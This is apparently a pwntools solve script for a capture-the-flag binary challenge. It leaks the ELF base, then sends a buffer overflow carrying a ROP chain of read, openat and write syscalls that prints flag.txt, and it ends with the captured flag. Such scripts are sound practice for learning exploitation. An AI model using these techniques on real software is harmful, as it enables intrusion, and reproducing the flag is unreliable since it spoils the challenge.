from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *(main+470)
    continue
''')

# p = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337)

# 1. leak elf base address
p.sendlineafter(b"What is your name, epic H4x0r?\n", b'H4x0r')
p.recvuntil(b"<|;)\n")
elf_base_addr = int(p.recvline().strip(), 16)-0x11a3
log.info(f"elf base address: {hex(elf_base_addr)}")

# 2. ROP to retrieve flag (open, read, write)
# syscall numbers
SYS_READ = 0
SYS_WRITE = 1
SYS_OPENAT = 257
# gadgets for setting up syscalls
POP_RAX_RET = elf_base_addr+0x119b
POP_RDI_RET = elf_base_addr+0x13db
POP_RSI_R15_RET = elf_base_addr+0x13d9
POP_RDX_RET = elf_base_addr+0x1199
SYSCALL_RET = elf_base_addr+0x119d
# addresses in bss section for filename and buffer
FILENAME_ADDR = elf_base_addr+0x4050
BUFFER_ADDR = elf_base_addr+0x4060
# ROP chain
chain = [
    # read(0, FILENAME_ADDR, 16)
    POP_RAX_RET, SYS_READ,
    POP_RDI_RET, 0,
    POP_RSI_R15_RET, FILENAME_ADDR, 0,
    POP_RDX_RET, 16,
    SYSCALL_RET,
    # openat(AT_FDCWD, FILENAME_ADDR, 0)    
    POP_RAX_RET, SYS_OPENAT,
    POP_RDI_RET, 0xffffffffffffff9c,
    POP_RSI_R15_RET, FILENAME_ADDR, 0,
    POP_RDX_RET, 0,
    SYSCALL_RET,
    # read(3, BUFFER_ADDR, 100)
    POP_RAX_RET, SYS_READ,
    POP_RDI_RET, 3,
    POP_RSI_R15_RET, BUFFER_ADDR, 0,
    POP_RDX_RET, 100,
    SYSCALL_RET,
    # write(1, BUFFER_ADDR, 100)
    POP_RAX_RET, SYS_WRITE,
    POP_RDI_RET, 1,
    # no need for POP_RSI_R15_RET, BUFFER_ADDR, 0,
    # no need for POP_RDX_RET, 100,
    SYSCALL_RET,
]
# since 0x255 bytes is limited for this payload, unnecessary ROP contents have to be removed
p.sendline(b'\x00'*0x118+b''.join(p64(c) for c in chain))
p.send(b'./flag.txt\x00')

p.interactive()

# wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}